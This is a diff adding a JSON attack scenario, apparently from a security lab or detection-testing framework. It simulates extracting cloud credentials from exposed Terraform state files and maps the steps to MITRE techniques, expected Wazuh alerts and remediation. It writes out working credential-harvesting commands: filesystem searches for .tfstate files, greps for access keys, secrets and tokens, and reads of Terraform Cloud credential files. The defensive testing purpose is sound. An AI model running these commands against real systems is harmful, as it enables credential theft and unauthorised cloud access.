@@ -1,0 +1,177 @@
+{
+  "id": "S6-04",
+  "name": "Terraform State File Credential Exposure",
+  "category": "Infrastructure",
+  "version": "1.0",
+  "description": "Exploit exposed Terraform state files to extract cloud credentials, secrets, and infrastructure topology. Terraform state files contain plaintext secrets by design.",
+  "difficulty": "Medium",
+  "real_world_relevance": "Terraform state in S3 buckets without encryption, GitLab CI artifacts, local filesystems. Bridgecrew 2021 study found 44% of scanned Terraform state files contained secrets.",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Collection"],
+    "techniques": [
+      {"id": "T1552.001", "name": "Unsecured Credentials: Credentials In Files"},
+      {"id": "T1213", "name": "Data from Information Repositories"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cloud-workload", "cicd-runner"],
+    "network": "cloud_net",
+    "permissions": "Read access to terraform state storage"
+  },
+
+  "attack_flow": {
+    "description": "Attacker locates and reads Terraform state files to extract cloud provider credentials and infrastructure secrets",
+    "diagram": [
+      "1. Attacker discovers Terraform state file location",
+      "2. Attacker reads .tfstate file (local, S3, or CI artifact)",
+      "3. Attacker extracts cloud provider credentials from state",
+      "4. Attacker maps infrastructure topology from state resources",
+      "5. Attacker uses stolen credentials for cloud API access"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "State File Discovery",
+      "description": "Locate Terraform state files in accessible locations",
+      "actions": [
+        {
+          "type": "command",
+          "command": "find / -name '*.tfstate' -o -name '*.tfstate.backup' -o -name 'terraform.tfvars' 2>/dev/null | head -10",
+          "expected_output_contains": [".tfstate"]
+        },
+        {
+          "type": "command",
+          "command": "ls -la /app/terraform/ 2>/dev/null || echo 'No local Terraform state'",
+          "description": "Check for local Terraform state directory"
+        },
+        {
+          "type": "command",
+          "command": "env | grep -i 'TF_\\|TERRAFORM\\|AWS_\\|GOOGLE_\\|ARM_' 2>/dev/null || echo 'No Terraform env vars'",
+          "description": "Check for Terraform-related environment variables"
+        }
+      ]
+    },
+    {
+      "name": "State File Credential Extraction",
+      "description": "Parse Terraform state for embedded credentials",
+      "critical": true,
+      "actions": [
+        {
+          "type": "command",
+          "command": "cat /app/terraform/terraform.tfstate 2>/dev/null | grep -E '(access_key|secret_key|password|token|client_secret|private_key)' | head -20",
+          "description": "Extract credentials from state file"
+        },
+        {
+          "type": "command",
+          "command": "cat /app/terraform/terraform.tfstate 2>/dev/null | grep -oP 'AKIA[0-9A-Z]{16}' | head -5",
+          "description": "Extract AWS access key patterns"
+        }
+      ]
+    },
+    {
+      "name": "Infrastructure Mapping",
+      "description": "Map cloud infrastructure from state file resources",
+      "actions": [
+        {
+          "type": "command",
+          "command": "cat /app/terraform/terraform.tfstate 2>/dev/null | python3 -c \"import sys,json; [print(r['type']) for r in json.load(sys.stdin).get('resources',[])]\" 2>/dev/null || echo 'Cannot parse state'",
+          "description": "Enumerate all managed resource types"
+        }
+      ]
+    },
+    {
+      "name": "Terraform Cloud Token Theft",
+      "description": "Check for Terraform Cloud API tokens",
+      "actions": [
+        {
+          "type": "command",
+          "command": "cat ~/.terraformrc 2>/dev/null; cat /root/.terraform.d/credentials.tfrc.json 2>/dev/null || echo 'No TF Cloud credentials'",
+          "description": "Check for Terraform Cloud tokens (atlasv1.*)"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "File Access",
+      "description": "Access to .tfstate files",
+      "wazuh_rule": "100600"
+    },
+    {
+      "type": "Secret Pattern",
+      "description": "Terraform Cloud token pattern detected",
+      "wazuh_rule": "100912"
+    },
+    {
+      "type": "Secret Pattern",
+      "description": "AWS access key pattern in state output",
+      "wazuh_rule": "100900"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100600",
+      "level": 10,
+      "description": "NHI: Environment configuration file access detected"
+    },
+    {
+      "rule_id": "100912",
+      "level": 12,
+      "description": "NHI: Terraform Cloud/Enterprise API token detected"
+    },
+    {
+      "rule_id": "100900",
+      "level": 12,
+      "description": "NHI: AWS Access Key ID pattern detected"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Rotate all credentials found in exposed state files",
+      "Move state to encrypted remote backend (S3+KMS, Terraform Cloud)",
+      "Review CI/CD artifact retention policies"
+    ],
+    "long_term": [
+      "Use remote state with encryption at rest and in transit",
+      "Enable state locking (DynamoDB for S3 backend)",
+      "Use sensitive attribute for outputs and variables",
+      "Implement CI/CD secret scanning on state files",
+      "Never commit .tfstate to version control"
+    ]
+  },
+
+  "demo_script": {
+    "container": "cloud-workload",
+    "commands": [
+      "# Step 1: Look for terraform state files",
+      "find / -name '*.tfstate' 2>/dev/null || echo 'No tfstate files found'",
+      "",
+      "# Step 2: Check for Terraform Cloud credentials",
+      "cat ~/.terraformrc 2>/dev/null || echo 'No Terraform Cloud config'",
+      "",
+      "# Step 3: Simulate parsing state for credentials",
+      "echo 'Would run: jq .resources[].instances[].attributes terraform.tfstate | grep -i key'"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "Terraform State Sensitive Data",
+      "url": "https://developer.hashicorp.com/terraform/language/state/sensitive-data"
+    },
+    {
+      "title": "MITRE ATT&CK T1552.001 - Credentials In Files",
+      "url": "https://attack.mitre.org/techniques/T1552/001/"
+    },
+    {
+      "title": "Bridgecrew Terraform State Security Study",
+      "url": "https://bridgecrew.io/blog/terraform-state-security/"
+    }
+  ]
+}
